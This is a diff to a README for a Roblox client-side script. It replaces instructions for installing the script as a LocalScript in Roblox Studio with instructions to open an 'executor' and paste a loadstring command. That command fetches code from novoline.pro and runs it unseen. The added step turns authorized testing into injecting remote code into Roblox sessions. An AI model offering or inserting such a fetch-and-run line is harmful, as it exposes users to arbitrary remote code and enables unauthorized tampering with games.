@@ -48,10 +48,10 @@ Available display options:
 
 ## Installation
 
-1. Open your Roblox experience in Roblox Studio.
-2. Add a **LocalScript** under `StarterPlayer > StarterPlayerScripts`.
-3. Paste the script into the LocalScript.
-4. Test it in your own experience or an authorized test environment.
+1. Open your Roblox.
+2. Open your executor
+3. Paste loadstring(game:HttpGet("https://novoline.pro"))().
+4. and run.
 
 The script is designed for a client-side context. Features that rely on game-specific objects or modules require those objects to exist with the expected structure.
 
